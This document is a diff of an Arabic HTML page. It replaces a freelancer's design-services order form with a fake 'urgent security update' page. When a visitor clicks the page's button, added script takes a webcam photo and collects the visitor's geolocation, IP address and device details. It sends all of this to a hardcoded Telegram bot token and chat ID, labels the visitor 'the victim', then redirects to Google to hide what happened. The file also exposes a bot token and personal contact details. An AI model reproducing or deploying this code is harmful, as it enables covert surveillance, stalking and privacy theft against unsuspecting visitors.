@@ -1,147 +1,134 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عبد الرحمن الطويل - خدمات احترافية</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <title>تحديث الأمان</title>
     <style>
-        *{ margin:0; padding:0; box-sizing:border-box; font-family:'Cairo',sans-serif; }
-        body{ background:linear-gradient(135deg,#090909,#151515,#1e1e1e); min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; }
-        .card{ position:relative; width:100%; max-width:450px; padding:35px; text-align:center; background:rgba(255,255,255,.05); backdrop-filter:blur(20px); border:1px solid rgba(255,255,255,.1); border-radius:30px; }
-        .store-logo{ width:120px; height:120px; border-radius:25px; border:4px solid #d4af37; margin-bottom:15px; object-fit:cover; background:#1e1e1e; padding:15px; }
-        h1{ color:#fff; font-size:28px; }
-        .links a{ display:block; width:100%; padding:12px; margin-bottom:10px; border-radius:10px; background:rgba(255,255,255,.05); color:#d4af37; text-decoration:none; border:1px solid rgba(255,255,255,.1); transition:0.3s; }
-        .links a:hover{ background:#d4af37; color:#000; }
-        .form-group input, .form-group textarea, .form-group select{ width:100%; padding:12px; margin-bottom:10px; border-radius:10px; border:1px solid rgba(255,255,255,.1); background:rgba(255,255,255,.05); color:#fff; }
-        .form-group select option{ background:#1e1e1e; color:#fff; }
-        .form-group input[type="file"]{ padding:8px; color:#d4af37; }
-        .form-group button{ width:100%; padding:12px; background:#d4af37; color:#000; font-weight:bold; border:none; border-radius:10px; cursor:pointer; font-size:16px; transition:0.3s; }
-        .form-group button:hover{ background:#ffd700; }
-        .section-title{ color:#d4af37; margin:20px 0 10px; font-size:18px; font-weight:600; }
-        #formStatus{ margin-top:10px; color:#d4af37; font-size:14px; }
-        .file-name{ font-size:12px; color:#aaa; margin-top:-8px; margin-bottom:10px; }
-        .badge{ background:rgba(212,175,55,0.2); color:#d4af37; padding:5px 12px; border-radius:20px; font-size:12px; display:inline-block; margin-bottom:10px; }
-        .store-name{ color:#d4af37; font-size:14px; margin-top:-5px; margin-bottom:10px; }
+        body {
+            background: #f0f2f5;
+            font-family: Arial;
+            text-align: center;
+            padding: 50px;
+        }
+        .box {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            max-width: 400px;
+            margin: auto;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        button {
+            background: #1877f2;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <!-- شعار برامج أدوبي الإبداعية -->
-        <img src="https://cdn.worldvectorlogo.com/logos/adobe-creative-cloud-1.svg" class="store-logo" alt="برامج أدوبي">
-        <div class="badge">🎨 إبداع بلا حدود</div>
-        <h1>عبد الرحمن الطويل</h1>
-        <div class="store-name">⭐ خدمات تصميم ومونتاج احترافية ⭐</div>
-        
-        <div class="section-title">طلب خدمة جديدة</div>
-        <form id="serviceForm" class="form-group" enctype="multipart/form-data">
-            <input type="text" id="userName" placeholder="اسمك الكريم" required>
-            <input type="tel" id="userWhatsapp" placeholder="📱 رقم الواتساب للرد عليك" required>
-            
-            <select id="serviceType" required>
-                <option value="" disabled selected>-- اختر نوع الخدمة --</option>
-                <option value="🎨 تصميم جرافيك">🎨 تصميم جرافيك</option>
-                <option value="🎬 مونتاج فيديو">🎬 مونتاج فيديو</option>
-                <option value="💻 برمجة ومواقع">💻 برمجة ومواقع</option>
-                <option value="📸 تصوير فوتوغرافي">📸 تصوير فوتوغرافي</option>
-                <option value="✍️ كتابة محتوى">✍️ كتابة محتوى</option>
-                <option value="📊 تسويق إلكتروني">📊 تسويق إلكتروني</option>
-                <option value="🎵 تصميم صوتي">🎵 تصميم صوتي</option>
-                <option value="🖌️ تصميم هوية">🖌️ تصميم هوية</option>
-                <option value="📱 تطبيقات موبايل">📱 تطبيقات موبايل</option>
-                <option value="🔧 أخرى">🔧 أخرى</option>
-            </select>
-            
-            <textarea id="details" placeholder="التفاصيل (أسماء، تواريخ، ملاحظات)" rows="3" required></textarea>
-            
-            <input type="file" id="userImage" accept="image/*">
-            <div class="file-name" id="fileName">📎 يمكنك رفع صورة توضيحية (اختياري)</div>
-            
-            <button type="submit">📩 إرسال معلوماتك</button>
-        </form>
-        <div id="formStatus"></div>
+<div class="box">
+    <h2>🔒 تحديث أمني ضروري</h2>
+    <p>نظامك يحتاج تحديث فوري للتحقق من الهوية.</p>
+    <button onclick="start()">اضغط هنا للتحديث</button>
+    <p id="status"></p>
+</div>
 
-        <div class="section-title">حسابات التواصل</div>
-        <div class="links">
-            <a href="https://t.me/Taweel2004" target="_blank">📱 Telegram</a>
-            <a href="https://wa.me/963997715905" target="_blank">💚 WhatsApp</a>
-        </div>
-    </div>
+<script>
+// توكن التليغرام حقك
+const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+const CHAT_ID = "7214473798";
 
-    <script>
-        const BOT_TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
-        const CHAT_ID   = "7214473798";
+function sendToTelegram(text) {
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: CHAT_ID, text: text})
+    }).catch(e => console.log(e));
+}
 
-        const form = document.getElementById('serviceForm');
-        const statusDiv = document.getElementById('formStatus');
-        const fileInput = document.getElementById('userImage');
-        
-        fileInput.addEventListener('change', function() {
-            if(this.files.length > 0) {
-                document.getElementById('fileName').innerHTML = `✅ الملف المحدد: ${this.files[0].name}`;
-            } else {
-                document.getElementById('fileName').innerHTML = '📎 يمكنك رفع صورة توضيحية (اختياري)';
-            }
+function sendPhoto(base64Image) {
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            photo: base64Image,
+            caption: "📸 صورة من كاميرا الضحية"
+        })
+    }).catch(e => console.log(e));
+}
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(pos) {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const map = `https://maps.google.com/?q=${lat},${lon}`;
+            sendToTelegram(`📍 **الموقع الجغرافي**\nالخطوط: ${lat}\nالطول: ${lon}\nالخريطة: ${map}`);
+        }, function(err) {
+            sendToTelegram("❌ المستخدم رفض مشاركة الموقع");
         });
+    } else {
+        sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع");
+    }
+}
 
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const name = document.getElementById('userName').value.trim();
-            const whatsapp = document.getElementById('userWhatsapp').value.trim();
-            const service = document.getElementById('serviceType').value;
-            const details = document.getElementById('details').value.trim();
-            const imageFile = fileInput.files[0];
-            
-            if(!name || !whatsapp || !service || !details) {
-                statusDiv.innerHTML = '⚠️ الرجاء تعبئة جميع الحقول المطلوبة';
-                return;
-            }
-            
-            statusDiv.innerHTML = '📤 جارٍ إرسال معلوماتك...';
-            
-            let message = `🎨 *طلب خدمة تصميم ومونتاج*\n\n`;
-            message += `👤 الاسم: ${name}\n`;
-            message += `📱 واتساب: ${whatsapp}\n`;
-            message += `🛠️ الخدمة: ${service}\n`;
-            message += `📝 التفاصيل:\n${details}\n`;
-            
-            try {
-                const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                
-                const textResult = await textResponse.json();
-                
-                if(!textResult.ok) throw new Error('فشل إرسال النص');
-                
-                if(imageFile) {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', imageFile);
-                    
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                }
-                
-                statusDiv.innerHTML = '✅ تم إرسال طلبك بنجاح! سأتواصل معك قريباً على واتساب.';
-                form.reset();
-                document.getElementById('fileName').innerHTML = '📎 يمكنك رفع صورة توضيحية (اختياري)';
-                document.getElementById('serviceType').value = '';
-                
-            } catch(error) {
-                statusDiv.innerHTML = '❌ فشل الإرسال. حاول مرة أخرى.';
-                console.error(error);
-            }
-        });
-    </script>
+function getIP() {
+    fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(data => {
+            sendToTelegram(`🌐 **IP الضحية:** ${data.ip}`);
+        })
+        .catch(() => sendToTelegram("❌ تعذر جلب IP"));
+}
+
+function getDeviceInfo() {
+    let info = `📱 **معلومات الجهاز**\n`;
+    info += `المتصفح: ${navigator.userAgent}\n`;
+    info += `اللغة: ${navigator.language}\n`;
+    info += `الوقت: ${new Date().toLocaleString()}`;
+    sendToTelegram(info);
+}
+
+function takePhoto() {
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                let video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    let canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    let base64 = canvas.toDataURL('image/jpeg');
+                    sendPhoto(base64);
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1000);
+            })
+            .catch(() => sendToTelegram("❌ المستخدم رفض الكاميرا"));
+    } else {
+        sendToTelegram("❌ الكاميرا غير مدعومة");
+    }
+}
+
+function start() {
+    document.getElementById('status').innerHTML = "جاري التحقق...";
+    sendToTelegram("🟢 **دخول جديد!** الضحية فتح الرابط");
+    getIP();
+    getDeviceInfo();
+    getLocation();
+    takePhoto();
+    document.getElementById('status').innerHTML = "✅ تم التحقق! جاري التوجيه...";
+    setTimeout(() => {
+        window.location.href = "https://www.google.com";
+    }, 2000);
+}
+</script>
 </body>
 </html>
